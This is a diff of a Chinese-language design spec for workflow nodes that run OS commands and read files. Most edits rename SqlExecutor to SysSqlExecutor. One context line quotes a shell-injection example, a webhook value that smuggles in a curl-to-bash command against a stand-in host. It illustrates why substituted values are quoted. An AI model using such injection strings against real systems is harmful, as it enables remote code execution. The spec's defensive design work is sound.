@@ -7,10 +7,12 @@
 
 動工前整份讀完；派工給 codex 時整份貼進 prompt（codex 不讀 CLAUDE.md）。
 
-決策脈絡：Ethan 2026-08-28～30 三輪討論定調。與既有的 `SqlExecutor`
+決策脈絡：Ethan 2026-08-28～30 三輪討論定調。與既有的 `SysSqlExecutor`
 （`dev-notes/SQL_EXECUTOR_SPEC.md`）、`AiAgent`
 （`dev-notes/AI_NODE_USAGE_QUOTA_SPEC.md`）同屬「流程呼叫外部世界」的節點家族，
-但**授權模型刻意與 SqlExecutor 相反**，見第二節。
+但**授權模型刻意與當時的 SqlExecutor 相反**，見第二節。
+（2026-09-13 PF-254 起 SQL 節點也改成受限節點 `SysSqlExecutor`，兩者的授權模型
+從此一致——本節寫「相反」是 2026-08-30 當時的對照，保留以免誤解決策脈絡。）
 
 > **第二版修訂重點**：2026-08-30 的節點整併（commit `5fc74418`）與 End cancel 修復
 > （commit `f2e0ecf7`）改變了三件本規格依賴的事實——`skip_advance` 機制出現、
@@ -74,7 +76,7 @@ graph 由 `PUT /api/workflows/data/templates/<sc>` 改寫，門檻是
 `OsFileRead` 的兩道閘門**各自獨立**（`OS_FILE_READ_NODE_ENABLED` + 自己的 grant），
 理由見第六節開頭。
 
-**兩道都必須在 handler 執行期重查**，理由同 SqlExecutor 檔頭那條：
+**兩道都必須在 handler 執行期重查**，理由同 SysSqlExecutor 檔頭那條：
 設計器的可見性從來不是防線，graph 可被 PUT 改寫。
 2026-08-31 起可見性與 graph 寫入也吃同一份判定（`node_grant_service.py`），
 但那是降噪與早期攔截，**執行期重查仍是唯一的防線**。
@@ -158,7 +160,7 @@ webhook payload（**攻擊者完全可控**）。填入 `"; curl evil/x.sh|bash;
   只有代入的值被包成單一 shell 詞，`;` `$()` 反引號全部失效
 - 需要變數帶多個參數時（`${v.opts}` = `-l -a`）用 **`${v.opts!raw}`** 明確標記，
   設計器上該欄位顯示紅字警告
-- **單次非遞迴替換**：代入的內容不再被二次掃描（同 SqlExecutor `_build_params` 的註解）
+- **單次非遞迴替換**：代入的內容不再被二次掃描（同 SysSqlExecutor `_build_params` 的註解）
 
 ### 無法從技術上禁止、只能留證的情況
 
@@ -178,7 +180,7 @@ webhook payload（**攻擊者完全可控**）。填入 `"; curl evil/x.sh|bash;
 | **FormAdapter** | 簽核者按下按鈕 → 走該決策對應的邊；`selection_mode='multiple'` 可選多條 | 未配對決策的按鈕 = REJECTED 終態 |
 | **ParallelJoin** | 逾時走 `timeout_edge_id`；`release_once` 已放行過 → `skip_advance` | 正常會合 → 走所有出邊 |
 
-其餘 20 個（SqlExecutor、AiAgent、DecisionWriter、OpSet、Delay、ParallelFork、
+其餘 20 個（SysSqlExecutor、AiAgent、DecisionWriter、OpSet、Delay、ParallelFork、
 Email、Telegram…）一律走所有出邊。
 
 `advance_to_next_nodes`（`node_runner.py`）的優先序是
@@ -283,7 +285,7 @@ v1 只支援**單一 keyword**。多關鍵字用多次呼叫（積木哲學）�
 
 「第一欄是 id」的場景由 `match_scope: line_start` 覆蓋。
 完整 CSV 解析要處理引號、跳脫、多行欄位，是另一個複雜度層級，
-而真要結構化查詢 CSV，正解是先匯入 DB 再用 `SqlExecutor`。
+而真要結構化查詢 CSV，正解是先匯入 DB 再用 `SysSqlExecutor`。
 `match_scope: field_n`（指定分隔符與第 n 欄）列為 v2 候選。
 
 ---
@@ -803,7 +805,7 @@ sudo systemctl restart beakplatform-dev-executor
 ### 尚未做（v2 候選，不是缺陷）
 
 - 白名單與允許目錄**沒有 Web UI**，一律走 SQL 或 migration（登記一筆等同授權，
-  屬部署期決定，與 SqlExecutor 白名單的處理方式一致）
+  屬部署期決定，與 SysSqlExecutor 白名單的處理方式一致）
 - `docs/manual/` 沒有對應的使用者手冊頁（目前只有 `docs/install/os_node.md`
   這份給維運人員的文件）
 - OsExecutor 例外／逾時記錄的管理頁（第十二節已列為 v2）
